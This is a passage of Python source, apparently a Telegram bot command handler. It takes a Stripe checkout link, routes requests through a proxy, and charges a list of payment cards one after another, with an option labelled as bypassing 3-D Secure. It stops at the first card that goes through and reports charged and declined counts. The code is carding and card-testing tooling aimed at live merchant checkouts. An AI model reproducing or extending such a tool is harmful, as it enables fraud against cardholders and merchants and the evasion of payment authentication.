    processing_msg = await msg.answer(
        "<blockquote><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        "「❃」 𝗮𝘁𝘂𝘀 : <code>Parsing checkout...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    checkout_data = await get_checkout_info(url)
    
    if checkout_data.get("error"):
        await processing_msg.edit_text(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>{checkout_data['error']}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not cards:
        currency = checkout_data.get('currency', '')
        sym = get_currency_symbol(currency)
        price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
        total_time = round(time.perf_counter() - start_time, 2)
        
        response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 {price_str} 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗖𝗦 : <code>{checkout_data['cs'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗞 : <code>{checkout_data['pk'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>SUCCESS ✅</code></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{checkout_data['country'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗠𝗼𝗱𝗲 : <code>{checkout_data['mode'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['customer_name'] or checkout_data['customer_email']:
            response += f"<blockquote>「❃」 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 : <code>{checkout_data['customer_name'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗘𝗺𝗮𝗶𝗹 : <code>{checkout_data['customer_email'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['support_email'] or checkout_data['support_phone']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : <code>{checkout_data['support_email'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗣𝗵𝗼𝗻𝗲 : <code>{checkout_data['support_phone'] or 'N/A'}</code></blockquote>\n\n"
        
        if checkout_data['cards_accepted']:
            response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{checkout_data['cards_accepted']}</code></blockquote>\n\n"
        
        if checkout_data['success_url'] or checkout_data['cancel_url']:
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 : <code>{checkout_data['success_url'] or 'N/A'}</code>\n"
            response += f"「❃」 𝗖𝗮𝗻𝗰𝗲𝗹 : <code>{checkout_data['cancel_url'] or 'N/A'}</code></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
        
        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
        return
    
    bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
    currency = checkout_data.get('currency', '')
    sym = get_currency_symbol(currency)
    price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
    
    await processing_msg.edit_text(
        f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
        f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
        f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = []
    charged_card = None
    cancelled = False
    check_interval = 5
    last_update = time.perf_counter()
    
    for i, card in enumerate(cards):
        if len(cards) > 1 and i > 0 and i % check_interval == 0:
            is_active = await check_checkout_active(checkout_data['pk'], checkout_data['cs'])
            if not is_active:
                cancelled = True
                break
        
        result = await charge_card(card, checkout_data, user_proxy, bypass_3ds)
        results.append(result)
        
        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
            last_update = time.perf_counter()
            charged = sum(1 for r in results if r['status'] == 'CHARGED')
            declined = sum(1 for r in results if r['status'] == 'DECLINED')
            three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
            
            try:
                await processing_msg.edit_text(
                    f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
                    f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
                    f"「❃」 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 : <code>{i+1}/{len(cards)}</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
                    f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
                    f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code>\n"
                    f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors} ⚠️</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        if result['status'] == 'CHARGED':
            charged_card = result
            break
    
    total_time = round(time.perf_counter() - start_time, 2)
    
    if cancelled:
        response = f"<blockquote><code>「 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱 ⛔ 」</code></blockquote>\n\n"
        response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
        response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
        response += f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Checkout no longer active</code></blockquote>\n\n"
        
        charged = sum(1 for r in results if r['status'] == 'CHARGED')
        declined = sum(1 for r in results if r['status'] == 'DECLINED')
        three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
        
        response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code>\n"
        response += f"「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined} ❌</code>\n"
        response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds} 🔐</code></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
        response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
        
        await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
        return
    
    response = f"<blockquote><code>「 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 {price_str} 」</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
    response += f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
    response += f"「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
    response += f"「❃」 𝗣𝗿𝗼𝗱𝘂𝗰𝘁 : <code>{checkout_data['product'] or 'N/A'}</code></blockquote>\n\n"
    
    if charged_card:
        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{charged_card['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>CHARGED ✅</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{charged_card['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{charged_card['time']}s</code></blockquote>\n\n"
        
        if checkout_data.get('success_url'):
            response += f"<blockquote>「❃」 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗨𝗥𝗟 : <a href=\"{checkout_data['success_url']}\">Open Success Page</a></blockquote>\n\n"
        
        response += f"<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 : <a href=\"{url}\">Open Checkout</a></blockquote>\n\n"
        
        if len(results) > 1:
            response += f"<blockquote>「❃」 𝗧𝗿𝗶𝗲𝗱 : <code>{len(results)}/{len(cards)} cards</code></blockquote>\n\n"
    elif len(results) == 1:
        r = results[0]
        if r['status'] == '3DS':
            status_emoji = "🔐"
        elif r['status'] == '3DS SKIP':
            status_emoji = "🔓"
        elif r['status'] == 'DECLINED':
            status_emoji = "❌"
        elif r['status'] == 'NOT SUPPORTED':
            status_emoji = "🚫"
        else:
            status_emoji = "⚠️"
        
        response += f"<blockquote>「❃」 𝗖𝗮𝗿𝗱 : <code>{r['card']}</code>\n"
        response += f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>{r['status']} {status_emoji}</code>\n"
        response += f"「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : <code>{r['response']}</code>\n"
        response += f"「❃」 𝗧𝗶𝗺𝗲 : <code>{r['time']}s</code></blockquote>\n\n"
    else:
        charged = sum(1 for r in results if r['status'] == 'CHARGED')
        declined = sum(1 for r in results if r['status'] == 'DECLINED')
        three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
        errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN'])
        total = len(results)
        
        response += f"<blockquote>「❃」 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 : <code>{charged}/{total} ✅</code>\n"
        response += f"「❃」 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <code>{declined}/{total} ❌</code>\n"
        response += f"「❃」 𝟯𝗗𝗦 : <code>{three_ds}/{total} 🔐</code>\n"
        if errors > 0:
            response += f"「❃」 𝗘𝗿𝗿𝗼𝗿𝘀 : <code>{errors}/{total} ⚠️</code>\n"
        response += f"</blockquote>\n\n"
    
    response += f"<blockquote>「❃」 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : <code>/co</code>\n"
    response += f"「❃」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : <code>{total_time}s</code></blockquote>"
    
    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
